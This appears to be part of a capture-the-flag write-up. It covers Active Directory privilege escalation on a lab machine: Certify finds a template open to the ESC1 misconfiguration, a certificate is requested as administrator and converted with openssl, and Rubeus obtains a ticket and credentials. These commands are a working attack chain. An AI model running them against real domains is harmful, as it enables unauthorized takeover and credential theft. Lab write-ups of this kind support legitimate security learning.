# Privilege Escalation
![[/assets/images/escape11.png]]
![[/assets/images/escape12.png]]

At this point, we need to find a way to elevate our privileges. Looking back at our initial enumeration output from Nmap we can see a lot of certificate related output. This is a strong indication that there is a Certificate Authority running. We can use Certify to enumerate possible misconfiguration in Active Directory Certificate Services.

```powershell
upload Certify.exe
.\Certify.exe cas
```

Enumerate vulnerable certificates
```powershell
.\Certify.exe find /vulnerable
```

![[/assets/images/escape15.png]]

Vulnerable template `UserAuthentication`. 
`Authenticated Users` can enroll for this template and since the `msPKI-Certificate-Name-Flag` is present and contains `ENROLLE_SUPPLIES_OBJECT` the template is vulnerable to the [ESC1](https://m365internals.com/2022/11/07/investigating-certificate-template-enrollment-attacks-adcs/) scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Administrator by exploiting this attack path. 

# Certify + Rubeus
```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:

```sh
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![[/assets/images/escape17.png]]

Iâ€™ll upload `cert.pfx`, as well as a copy of [Rubeus](https://github.com/GhostPack/Rubeus) (downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection)), and then run the `asktgt` command, passing it the certificate to get a TGT as administrator:

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```
